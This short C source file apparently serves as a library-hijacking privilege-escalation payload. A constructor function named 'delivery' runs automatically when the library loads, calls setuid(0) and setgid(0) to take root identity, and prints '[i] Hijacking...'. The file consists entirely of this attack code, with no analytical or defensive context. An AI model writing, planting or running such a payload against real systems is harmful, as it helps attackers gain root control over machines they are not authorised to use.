#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void delivery() __attribute__((constructor));

void delivery() {
	setuid(0);
	setgid(0);
    printf("\n[i] Hijacking...");
}
